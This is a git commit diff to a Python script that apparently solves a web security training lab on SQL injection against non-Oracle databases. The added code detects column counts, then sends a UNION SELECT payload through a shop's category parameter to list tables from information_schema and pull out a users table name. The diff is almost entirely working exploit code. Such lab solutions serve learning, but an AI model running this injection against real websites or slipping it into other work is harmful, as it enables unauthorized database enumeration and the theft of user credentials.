4892e0f0271c744037a31c9e411754bfd08c83e3
madi <madimirzakup@gmail.com>
2025-01-15 05:54:51 +0500

    #

--- Server Side Topics/SQLi/SQL injection attack, listing the database contents on non-Oracle databases/payload.py
+++ Server Side Topics/SQLi/SQL injection attack, listing the database contents on non-Oracle databases/payload.py
@@ -1,6 +1,7 @@
 import sys
 import logging
 import urllib3
+import re
 
 import requests
 
@@ -22,7 +23,23 @@ def main(args):
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, sess)
     num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy)
-    
+    if not num_columns:
+        log.error("Could not determine number of columns. Exiting")
+        sys.exit(-1)
+    text_columns = utils.determine_text_columns(
+        shop.category_url, shop.no_proxy, num_columns
+    )
+    log.info("Getting users table")
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = "table_name"
+    nulls = ",".join(nulls)
+    resp = shop.get_category(
+        f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
+    )
+    pattern = re.compile(r"<th>(users_.*?)</th>")
+    m = pattern.search(resp.text)
+    users_table = m[1]
+    log.info(f"Found users table: {users_table}")
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
     main(args)
